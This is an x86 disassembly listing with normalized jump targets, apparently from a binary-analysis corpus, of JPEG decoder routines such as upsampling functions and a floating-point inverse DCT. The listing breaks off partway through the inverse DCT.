push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x1b0 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov esi [ ebx + 0x10 ]
mov edx [ ebx + 0x18 ]
push [ eax ]
mov eax [ ebp + 0x8 ]
pop ecx
sub eax ecx
sub esi edx
cmp eax esi
jae r-xdata
mov eax [ ebx + 0x10 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
mov ecx [ ebx + 0x14 ]
mov edx [ ebx + 0x8 ]
mov esi [ eax + 0x4 ]
call [ esi + 0x1c ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
sub eax [ ebx + 0x14 ]
cmp eax esi
jae r-xdata
mov esi eax
push esi
mov eax [ ebp + 0xc ]
shl edx 0x2
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
shl ecx 0x2
add ecx [ ebp + 0x10 ]
add edx [ ebx + 0xc ]
mov edi [ eax + 0x1cc ]
call [ edi + 0x4 ]
mov eax [ ebp + 0xc ]
add [ eax ] esi
add [ ebx + 0x18 ] esi
mov eax [ ebx + 0x10 ]
cmp eax [ ebx + 0x18 ]
ja r-xdata
mov esi eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
add [ ebx + 0x14 ] eax
xor edx edx
mov [ ebx + 0x18 ] edx
sub_494038
push ebx
push esi
mov esi eax
push edi
mov eax esi
push ecx
mov [ esp ] edx
mov edx 0x1
mov ebx [ eax + 0x4 ]
mov ecx 0x1c
call [ ebx ]
mov ebx eax
xor eax eax
mov [ esi + 0x1b0 ] ebx
xor edx edx
mov [ ebx ] sub_493dd8
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
cmp [ esi + 0x54 ] 0x0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x138 ]
mov [ ebx + 0x10 ] edi
cmp [ esp ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx 0x1
push eax
mov eax esi
mov ecx [ esi + 0x70 ]
imul ecx [ esi + 0x78 ]
mov esi [ eax + 0x4 ]
call [ esi + 0x8 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x70 ]
imul [ esi + 0x78 ]
push eax
mov edx edi
mov eax [ esi + 0x74 ]
call sub_497758
push eax
mov eax esi
mov edx [ ebx + 0x10 ]
xor ecx ecx
push edx
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi + 0x10 ]
mov [ ebx + 0x8 ] eax
jmp r-xdata
sub_4940cc
push ebx
push esi
push edi
push ebp
add esp 0xffffffd0
xor edx edx
xor ecx ecx
mov [ esp ] eax
mov eax [ esp ]
mov eax [ eax + 0x1c0 ]
mov [ esp + 0xc ] edx
mov [ esp + 0x10 ] ecx
xor edx edx
mov [ esp + 0x4 ] edx
add eax 0x4
mov ecx [ esp ]
mov edx [ ecx + 0xd8 ]
mov [ esp + 0x8 ] edx
mov [ esp + 0x20 ] eax
jmp r-xdata
mov ecx [ esp ]
mov eax [ ecx + 0x24 ]
cmp eax [ esp + 0x4 ]
jg r-xdata
mov ecx [ esp + 0x8 ]
mov eax [ ecx + 0x24 ]
dec eax
je r-xdata
add esp 0x30
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x10 ] sub_4958b4
xor edx edx
mov [ esp + 0xc ] edx
jmp r-xdata
dec eax
je r-xdata
mov ecx [ esp + 0x20 ]
mov eax [ esp + 0x10 ]
mov [ ecx ] eax
mov edx [ esp + 0x8 ]
cmp [ edx + 0x30 ] 0x0
je r-xdata
mov [ esp + 0x10 ] sub_4956c4
xor ecx ecx
mov [ esp + 0xc ] ecx
jmp r-xdata
sub eax 0x2
je r-xdata
add [ esp + 0x20 ] 0x4
inc [ esp + 0x4 ]
add [ esp + 0x8 ] 0x54
mov ecx [ esp + 0x20 ]
mov eax [ ecx + 0x28 ]
cmp eax [ esp + 0xc ]
je r-xdata
mov [ esp + 0x10 ] sub_495310
xor eax eax
mov [ esp + 0xc ] eax
jmp r-xdata
sub eax 0x4
je r-xdata
mov edx [ esp + 0x8 ]
mov ecx [ edx + 0x4c ]
mov [ esp + 0x14 ] ecx
cmp [ esp + 0x14 ] 0x0
je r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x48 ]
dec ecx
je r-xdata
jmp r-xdata
mov eax [ esp + 0x20 ]
mov edx [ esp + 0xc ]
mov [ eax + 0x28 ] edx
mov ecx [ esp + 0xc ]
sub ecx 0x1
jb r-xdata
mov [ esp + 0x10 ] sub_494edc
mov [ esp + 0xc ] 0x1
jmp r-xdata
dec ecx
je r-xdata
mov ecx [ esp ]
mov eax [ ecx ]
mov [ eax + 0x14 ] 0x7
mov edx [ esp + 0x8 ]
mov ecx [ edx + 0x24 ]
mov [ eax + 0x18 ] ecx
mov eax [ esp ]
mov edx [ eax ]
call [ edx ]
mov eax [ esp + 0x8 ]
mov edx [ eax + 0x50 ]
xor eax eax
mov ecx edx
mov edx [ esp + 0x14 ]
je r-xdata
mov [ esp + 0x10 ] sub_494a98
mov [ esp + 0xc ] 0x2
jmp r-xdata
jmp r-xdata
movzx ebx [ edx ]
mov [ ecx ] ebx
inc eax
add ecx 0x4
add edx 0x2
cmp eax 0x40
jl r-xdata
jmp r-xdata
mov eax [ esp + 0x8 ]
mov edx [ eax + 0x50 ]
xor eax eax
mov [ esp + 0x24 ] edx
mov ecx rw-data
mov edx [ esp + 0x14 ]
dec ecx
je r-xdata
mov eax [ esp ]
mov edx [ eax ]
mov [ edx + 0x14 ] 0x30
mov eax [ esp ]
mov edx [ eax ]
call [ edx ]
jmp r-xdata
movzx ebx [ edx ]
movsx esi [ ecx ]
imul ebx esi
add ebx 0x800
mov esi [ esp + 0x24 ]
sar ebx 0xc
add ecx 0x2
mov [ esi ] ebx
add edx 0x2
add [ esp + 0x24 ] 0x4
inc eax
cmp eax 0x40
jl r-xdata
jmp r-xdata
mov eax [ esp + 0x8 ]
mov edx [ eax + 0x50 ]
xor eax eax
mov [ esp + 0x18 ] edx
xor edx edx
mov [ esp + 0x1c ] edx
mov [ esp + 0x28 ] rw-data
jmp r-xdata
movzx ebp [ edx ]
mov [ esp + 0x2c ] ebp
add edx 0x2
fild [ esp + 0x2c ]
inc eax
inc edi
fmul [ esi ]
fmul [ ecx ]
add ecx 0x8
fstp [ ebx ]
add ebx 0x4
cmp edi 0x8
jl r-xdata
inc [ esp + 0x1c ]
add [ esp + 0x28 ] 0x8
cmp [ esp + 0x1c ] 0x8
jl r-xdata
mov eax [ esp ]
mov edx [ eax ]
mov [ edx + 0x14 ] 0x30
mov eax [ esp ]
mov edx [ eax ]
call [ edx ]
xor edi edi
mov edx [ esp + 0x18 ]
lea ebx [ edx + eax * 4 ]
mov ecx rw-data
mov edx [ esp + 0x28 ]
mov esi edx
mov edx [ esp + 0x14 ]
lea edx [ edx + eax * 2 ]
jmp r-xdata
sub_494320
push ebx
push esi
mov esi eax
push edi
mov eax esi
push ebp
push ecx
mov ecx 0x54
mov ebx [ eax + 0x4 ]
mov edx 0x1
call [ ebx ]
mov [ esi + 0x1c0 ] eax
mov [ eax ] sub_4940cc
xor edx edx
lea edi [ eax + 0x2c ]
mov [ esp ] edx
mov ebx [ esi + 0xd8 ]
jmp r-xdata
mov edx [ esp ]
cmp edx [ esi + 0x24 ]
jl r-xdata
mov eax esi
mov ecx 0x100
mov edx 0x1
mov ebp [ eax + 0x4 ]
call [ ebp ]
mov [ ebx + 0x50 ] eax
push 0x100
push 0x0
mov eax [ ebx + 0x50 ]
push eax
call sub_48ab3c
add esp 0xc
mov [ edi ] 0xffffffff
add edi 0x4
inc [ esp ]
add ebx 0x54
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4943b4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov esi eax
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx [ esi + 0x1c4 ]
mov eax [ ebx + 0x5c ]
cmp eax [ esi + 0x138 ]
jl r-xdata
mov edx [ esi + 0x138 ]
mov eax [ ebx + 0x5c ]
sub edx eax
mov [ ebp - 0x14 ] edx
mov edx [ ebx + 0x60 ]
cmp edx [ ebp - 0x14 ]
jae r-xdata
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx [ esi + 0xd8 ]
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0x4 ]
mov edx eax
mov [ ebp - 0x1c ] edx
lea ecx [ ebx + 0x34 ]
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
sub [ ebp + 0x8 ] edx
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp + 0x8 ]
jbe r-xdata
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0xc ]
cmp ecx [ esi + 0x24 ]
jl r-xdata
shl edx 0x2
mov ecx eax
add edx [ ebp + 0x10 ]
mov eax esi
push edx
mov edx [ ebp - 0x14 ]
push edx
lea edx [ ebx + 0xc ]
mov edi [ eax + 0x1c8 ]
call [ edi + 0x4 ]
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov ecx [ ebp - 0x14 ]
sub [ ebx + 0x60 ] ecx
mov eax [ ebx + 0x5c ]
add eax [ ebp - 0x14 ]
mov [ ebx + 0x5c ] eax
cmp eax [ esi + 0x138 ]
jl r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0xc ]
shl eax 0x2
add eax ebx
add eax 0xc
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
mov edi [ ebp - 0x18 ]
mov ecx [ edx ]
imul ecx [ eax + 0x30 ]
mov edx [ ebp - 0x1c ]
mov eax esi
shl ecx 0x2
add ecx [ edx ]
mov edx [ ebp - 0x10 ]
call [ edi ]
add [ ebp - 0x18 ] 0x4
add [ ebp - 0x1c ] 0x4
inc [ ebp - 0xc ]
add [ ebp - 0x10 ] 0x54
xor eax eax
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov edx [ ebp - 0x8 ]
inc [ edx ]
sub_4944d0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0x8 ]
mov eax [ eax + 0x1c4 ]
mov ebx [ ebx ]
mov [ ebp - 0x8 ] ebx
mov ebx [ edx + 0x4 ]
xor edx edx
movzx esi [ eax + ebx + 0x8c ]
mov [ ebp - 0xc ] esi
movzx eax [ eax + ebx + 0x96 ]
mov [ ebp - 0x10 ] eax
mov eax edx
mov [ ebp - 0x14 ] edx
lea ecx [ ecx + eax * 4 ]
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x138 ]
cmp ecx [ ebp - 0x14 ]
jg r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov esi [ eax ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + edx * 4 ]
mov edx [ ebp - 0x4 ]
mov edi [ edx + 0x70 ]
add edi eax
cmp edi eax
jbe r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x10 ] 0x1
jle r-xdata
mov cl [ esi ]
inc esi
mov edx [ ebp - 0xc ]
test edx edx
jle r-xdata
add [ ebp - 0x18 ] 0x4
mov eax [ ebp - 0x10 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
inc eax
push eax
mov eax [ ebp - 0x10 ]
dec eax
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x70 ]
push ecx
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
call sub_497770
cmp edi eax
ja r-xdata
mov [ eax ] cl
inc eax
dec edx
test edx edx
jg r-xdata
sub_49458c
push ebp
mov ebp esp
add esp 0xfffffff4
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0xc ] eax
mov eax ecx
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x138 ]
cmp edx [ ebp - 0x8 ]
jg r-xdata
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov esi [ eax ]
mov edx [ edx ]
mov edi [ ecx + 0x70 ]
add edi edx
cmp edi edx
jbe r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
inc [ ebp - 0x8 ]
add [ ebp - 0xc ] 0x4
add eax 0x4
mov cl [ esi ]
inc esi
mov [ edx ] cl
inc edx
mov [ edx ] cl
inc edx
cmp edi edx
ja r-xdata
sub_4945e8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
xor eax eax
mov [ ebp - 0x8 ] edx
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0xc ]
lea eax [ ecx + eax * 4 ]
lea edx [ edx + ebx * 4 ]
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x138 ]
cmp ecx [ ebp - 0xc ]
jg r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ eax ]
mov esi [ edx + 0x70 ]
add esi eax
mov ecx [ ecx ]
cmp esi eax
jbe r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0xc ]
inc eax
push eax
push 0x1
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x70 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_497770
add [ ebp - 0x10 ] 0x4
add [ ebp - 0xc ] 0x2
add [ ebp - 0x14 ] 0x8
mov dl [ ecx ]
inc ecx
mov [ eax ] dl
inc eax
mov [ eax ] dl
inc eax
cmp esi eax
ja r-xdata
sub_494678
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
mov eax ecx
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x138 ]
cmp ecx [ ebp - 0xc ]
jg r-xdata
mov esi [ eax ]
mov edx [ ebp - 0x10 ]
mov ecx [ edx ]
xor edx edx
mov dl [ esi ]
inc esi
mov [ ecx ] dl
inc ecx
lea edx [ edx + edx * 2 ]
xor ebx ebx
mov bl [ esi ]
add edx ebx
add edx 0x2
sar edx 0x2
mov [ ecx ] dl
inc ecx
mov edx [ ebp - 0x8 ]
mov edi [ edx + 0x28 ]
sub edi 0x2
test edi edi
jbe r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor edx edx
mov dl [ esi ]
movzx esi [ esi - 0x1 ]
lea ebx [ edx + edx * 2 ]
add ebx esi
inc ebx
sar ebx 0x2
mov [ ecx ] bl
inc ecx
mov [ ecx ] dl
inc [ ebp - 0xc ]
add [ ebp - 0x10 ] 0x4
add eax 0x4
xor edx edx
xor ebx ebx
mov dl [ esi ]
inc esi
dec edi
mov bl [ esi - 0x2 ]
lea edx [ edx + edx * 2 ]
add ebx edx
inc ebx
sar ebx 0x2
mov [ ecx ] bl
xor ebx ebx
mov bl [ esi ]
inc ecx
add edx ebx
add edx 0x2
sar edx 0x2
mov [ ecx ] dl
inc ecx
test edi edi
ja r-xdata
sub_49472c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
mov ebx eax
lea eax [ ecx + ebx * 4 ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x138 ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x1c ]
lea eax [ eax + ecx * 4 ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x2c ]
mov eax ecx
mov [ ebp - 0x24 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x24 ]
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x24 ]
mov eax [ ecx - 0x4 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
lea eax [ esi + esi * 2 ]
add eax [ ebp - 0x14 ]
add eax 0x8
sar eax 0x4
mov [ ecx ] al
mov eax esi
shl eax 0x2
inc ecx
add eax 0x7
sar eax 0x4
mov [ ecx ] al
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x2
jl r-xdata
mov eax [ ebp - 0xc ]
movzx eax [ eax ]
lea edi [ eax + eax * 2 ]
mov eax [ ebp - 0x10 ]
movzx eax [ eax ]
inc [ ebp - 0x10 ]
add edi eax
inc [ ebp - 0xc ]
lea eax [ esi + esi * 2 ]
mov ebx eax
add eax edi
add ebx [ ebp - 0x14 ]
add eax 0x7
add ebx 0x8
sar ebx 0x4
mov [ ecx ] bl
inc ecx
sar eax 0x4
mov [ ecx ] al
mov [ ebp - 0x14 ] esi
dec [ ebp - 0x18 ]
inc ecx
cmp [ ebp - 0x18 ] 0x0
mov esi edi
ja r-xdata
mov ecx [ ebp - 0x28 ]
mov ecx [ ecx ]
inc [ ebp - 0x1c ]
add [ ebp - 0x28 ] 0x4
mov eax [ ebp - 0xc ]
movzx eax [ eax ]
lea esi [ eax + eax * 2 ]
mov eax [ ebp - 0x10 ]
movzx eax [ eax ]
inc [ ebp - 0x10 ]
inc [ ebp - 0xc ]
add esi eax
mov eax [ ebp - 0xc ]
movzx eax [ eax ]
lea edi [ eax + eax * 2 ]
mov eax [ ebp - 0x10 ]
movzx eax [ eax ]
add edi eax
mov eax esi
inc [ ebp - 0x10 ]
inc [ ebp - 0xc ]
shl eax 0x2
add eax 0x8
sar eax 0x4
mov [ ecx ] al
lea eax [ esi + esi * 2 ]
add eax edi
inc ecx
add eax 0x7
sar eax 0x4
mov [ ecx ] al
mov [ ebp - 0x14 ] esi
mov eax [ edx + 0x28 ]
inc ecx
sub eax 0x2
mov esi edi
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jbe r-xdata
mov ecx [ ebp - 0x24 ]
mov eax [ ecx ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
add [ ebp - 0x2c ] 0x4
sub_494880
push ebx
mov ebx eax
mov eax ebx
push esi
push edi
push ebp
mov esi [ eax + 0x4 ]
add esp 0xffffffe4
mov ecx 0xa0
mov edx 0x1
call [ esi ]
mov [ esp ] eax
mov eax [ esp ]
mov [ ebx + 0x1c4 ] eax
mov edx [ esp ]
mov [ edx ] sub_49439c
mov ecx [ esp ]
mov [ ecx + 0x4 ] sub_4943b4
mov eax [ esp ]
xor edx edx
mov [ eax + 0x8 ] edx
cmp [ ebx + 0x12c ] 0x0
je r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x19
mov edx [ eax ]
call [ edx ]
xor ecx ecx
jmp r-xdata
cmp [ ebx + 0x13c ] 0x1
jg r-xdata
mov [ esp + 0xc ] ecx
xor eax eax
mov [ esp + 0x4 ] eax
mov edi [ ebx + 0xd8 ]
mov eax [ esp ]
lea edx [ eax + 0x8c ]
mov [ esp + 0x18 ] edx
mov ecx [ esp ]
lea esi [ ecx + 0x64 ]
jmp r-xdata
mov ecx 0x1
mov eax [ esp + 0x4 ]
cmp eax [ ebx + 0x24 ]
jl r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ edi + 0x24 ]
imul ecx
cdq
idiv [ ebx + 0x13c ]
mov ebp eax
mov eax [ edi + 0xc ]
imul ecx
cdq
idiv [ ebx + 0x13c ]
mov ecx eax
mov eax [ ebx + 0x134 ]
mov [ esp + 0x10 ] eax
mov edx [ ebx + 0x138 ]
mov [ esp + 0x14 ] edx
mov [ esi ] ecx
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x30 ] 0x0
jne r-xdata
add esp 0x1c
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp [ esp + 0x10 ]
jne r-xdata
mov [ esi - 0x30 ] sub_4944c0
xor ecx ecx
mov [ esp + 0x8 ] ecx
jmp r-xdata
mov edx ebp
add edx edx
cmp edx [ esp + 0x10 ]
jne r-xdata
cmp ecx [ esp + 0x14 ]
jne r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov eax ebp
add eax eax
cmp eax [ esp + 0x10 ]
jne r-xdata
cmp ecx [ esp + 0x14 ]
jne r-xdata
mov [ esi - 0x30 ] sub_4944b4
xor eax eax
mov [ esp + 0x8 ] eax
jmp r-xdata
add esi 0x4
inc [ esp + 0x18 ]
inc [ esp + 0x4 ]
add edi 0x54
mov ecx [ ebx + 0x138 ]
push ecx
mov edx [ ebx + 0x134 ]
mov eax [ ebx + 0x70 ]
call sub_497758
mov ecx eax
mov eax ebx
mov edx 0x1
mov ebp [ eax + 0x4 ]
call [ ebp + 0x8 ]
mov [ esi - 0x58 ] eax
mov eax [ esp + 0x10 ]
cdq
idiv ebp
test edx edx
jne r-xdata
mov edx ecx
add edx edx
cmp edx [ esp + 0x14 ]
jne r-xdata
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x26
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ esp + 0x14 ]
cdq
idiv ecx
test edx edx
jne r-xdata
cmp [ esp + 0xc ] 0x0
je r-xdata
mov [ esi - 0x30 ] sub_49458c
jmp r-xdata
cmp [ edi + 0x28 ] 0x2
jbe r-xdata
mov [ esi - 0x30 ] sub_4944d0
mov eax [ esp + 0x10 ]
cdq
idiv ebp
mov edx [ esp + 0x18 ]
mov [ edx ] al
mov eax [ esp + 0x14 ]
cdq
idiv ecx
mov ecx [ esp + 0x18 ]
mov [ ecx + 0xa ] al
jmp r-xdata
mov [ esi - 0x30 ] sub_4945e8
jmp r-xdata
cmp [ edi + 0x28 ] 0x2
jbe r-xdata
mov [ esi - 0x30 ] sub_494678
jmp r-xdata
mov [ esi - 0x30 ] sub_49472c
mov ecx [ esp ]
mov [ ecx + 0x8 ] 0x1
jmp r-xdata
sub_494a98
push ebp
mov ebp esp
add esp 0xfffffeb0
push ebx
push esi
push edi
mov edi 0x8
mov eax [ eax + 0x144 ]
lea ebx [ ebp - 0x150 ]
add eax 0x80
mov [ ebp - 0x48 ] eax
mov eax ecx
mov edx [ edx + 0x50 ]
fild [ eax ]
fmul [ edx ]
fstp [ ebp - 0x4 ]
fild [ eax + 0x20 ]
fmul [ edx + 0x40 ]
fstp [ ebp - 0x8 ]
fild [ eax + 0x40 ]
fmul [ edx + 0x80 ]
fstp [ ebp - 0xc ]
fild [ eax + 0x60 ]
fmul [ edx + 0xc0 ]
fstp [ ebp - 0x10 ]
fld [ ebp - 0x4 ]
fadd [ ebp - 0xc ]
fstp [ ebp - 0x24 ]
fld [ ebp - 0x4 ]
fsub [ ebp - 0xc ]
fstp [ ebp - 0x28 ]
fld [ ebp - 0x8 ]
fadd [ ebp - 0x10 ]
fstp [ ebp - 0x30 ]
fld [ ebp - 0x8 ]
fsub [ ebp - 0x10 ]
fmul [ r-xdata ]
fsub [ ebp - 0x30 ]
fstp [ ebp - 0x2c ]
fld [ ebp - 0x24 ]
fadd [ ebp - 0x30 ]
fstp [ ebp - 0x4 ]
fld [ ebp - 0x24 ]
fsub [ ebp - 0x30 ]
fstp [ ebp - 0x10 ]
fld [ ebp - 0x28 ]
fadd [ ebp - 0x2c ]
fstp [ ebp - 0x8 ]
fld [ ebp - 0x28 ]
fsub [ ebp - 0x2c ]
fstp [ ebp - 0xc ]
fild [ eax + 0x10 ]
fmul [ edx + 0x20 ]
fstp [ ebp - 0x14 ]
fild [ eax + 0x30 ]
fmul [ edx + 0x60 ]
fstp [ ebp - 0x18 ]
fild [ eax + 0x50 ]
fmul [ edx + 0xa0 ]
fstp [ ebp - 0x1c ]
fild [ eax + 0x70 ]
fmul [ edx + 0xe0 ]
fstp [ ebp - 0x20 ]
fld [ ebp - 0x1c ]
fadd [ ebp - 0x18 ]
fstp [ ebp - 0x44 ]
fld [ ebp - 0x1c ]
fsub [ ebp - 0x18 ]
fstp [ ebp - 0x38 ]
fld [ ebp - 0x14 ]
fadd [ ebp - 0x20 ]
fstp [ ebp - 0x3c ]
fld [ ebp - 0x14 ]
fsub [ ebp - 0x20 ]
fstp [ ebp - 0x40 ]
fld [ ebp - 0x3c ]
fadd [ ebp - 0x44 ]
fstp [ ebp - 0x20 ]
fld [ ebp - 0x3c ]
fsub [ ebp - 0x44 ]
fmul [ r-xdata ]
fstp [ ebp - 0x28 ]
fld [ ebp - 0x38 ]
fadd [ ebp - 0x40 ]
fmul [ r-xdata ]
fstp [ ebp - 0x34 ]
fld [ r-xdata ]
fmul [ ebp - 0x40 ]
fsub [ ebp - 0x34 ]
fstp [ ebp - 0x24 ]
fld [ r-xdata ]
fmul [ ebp - 0x38 ]
add eax 0x2
add edx 0x4
fadd [ ebp - 0x34 ]
fstp [ ebp - 0x2c ]
fld [ ebp - 0x2c ]
fsub [ ebp - 0x20 ]
fstp [ ebp - 0x1c ]
fld [ ebp - 0x28 ]
fsub [ ebp - 0x1c ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x24 ]
fadd [ ebp - 0x18 ]
fstp [ ebp - 0x14 ]
fld [ ebp - 0x4 ]
fadd [ ebp - 0x20 ]
fstp [ ebx ]
fld [ ebp - 0x4 ]
fsub [ ebp - 0x20 ]
fstp [ ebx + 0xe0 ]
fld [ ebp - 0x8 ]
fadd [ ebp - 0x1c ]
fstp [ ebx + 0x20 ]
fld [ ebp - 0x8 ]
fsub [ ebp - 0x1c ]
fstp [ ebx + 0xc0 ]
fld [ ebp - 0xc ]
fadd [ ebp - 0x18 ]
fstp [ ebx + 0x40 ]
fld [ ebp - 0xc ]
fsub [ ebp - 0x18 ]
fstp [ ebx + 0xa0 ]
fld [ ebp - 0x10 ]
fadd [ ebp - 0x14 ]
fstp [ ebx + 0x80 ]
fld [ ebp - 0x10 ]
fsub [ ebp - 0x14 ]
fstp [ ebx + 0x60 ]
add ebx 0x4
cmp [ eax + 0x20 ] 0x0
jne r-xdata
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
lea ebx [ ebp - 0x150 ]
mov edx eax
xor edi edi
mov [ ebp - 0x50 ] edx
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x50 ]
fld [ ebx ]
fadd [ ebx + 0x10 ]
mov esi [ ecx ]
add esi [ ebp + 0x8 ]
fstp [ ebp - 0x24 ]
fld [ ebx ]
fsub [ ebx + 0x10 ]
fstp [ ebp - 0x28 ]
fld [ ebx + 0x8 ]
fadd [ ebx + 0x18 ]
fstp [ ebp - 0x30 ]
fld [ ebx + 0x8 ]
fsub [ ebx + 0x18 ]
fmul [ r-xdata ]
fsub [ ebp - 0x30 ]
fstp [ ebp - 0x2c ]
fld [ ebp - 0x24 ]
fadd [ ebp - 0x30 ]
fstp [ ebp - 0x4 ]
fld [ ebp - 0x24 ]
fsub [ ebp - 0x30 ]
fstp [ ebp - 0x10 ]
fld [ ebp - 0x28 ]
fadd [ ebp - 0x2c ]
fstp [ ebp - 0x8 ]
fld [ ebp - 0x28 ]
fsub [ ebp - 0x2c ]
fstp [ ebp - 0xc ]
fld [ ebx + 0x14 ]
fadd [ ebx + 0xc ]
fstp [ ebp - 0x44 ]
fld [ ebx + 0x14 ]
fsub [ ebx + 0xc ]
fstp [ ebp - 0x38 ]
fld [ ebx + 0x4 ]
fadd [ ebx + 0x1c ]
fstp [ ebp - 0x3c ]
fld [ ebx + 0x4 ]
fsub [ ebx + 0x1c ]
fstp [ ebp - 0x40 ]
fld [ ebp - 0x3c ]
fadd [ ebp - 0x44 ]
fstp [ ebp - 0x20 ]
fld [ ebp - 0x3c ]
fsub [ ebp - 0x44 ]
fmul [ r-xdata ]
fstp [ ebp - 0x28 ]
fld [ ebp - 0x38 ]
fadd [ ebp - 0x40 ]
fmul [ r-xdata ]
fstp [ ebp - 0x34 ]
fld [ r-xdata ]
fmul [ ebp - 0x40 ]
fsub [ ebp - 0x34 ]
fstp [ ebp - 0x24 ]
fld [ r-xdata ]
fmul [ ebp - 0x38 ]
fadd [ ebp - 0x34 ]
fstp [ ebp - 0x2c ]
fld [ ebp - 0x2c ]
fsub [ ebp - 0x20 ]
fstp [ ebp - 0x1c ]
fld [ ebp - 0x28 ]
fsub [ ebp - 0x1c ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x24 ]
fadd [ ebp - 0x18 ]
fstp [ ebp - 0x14 ]
fld [ ebp - 0x4 ]
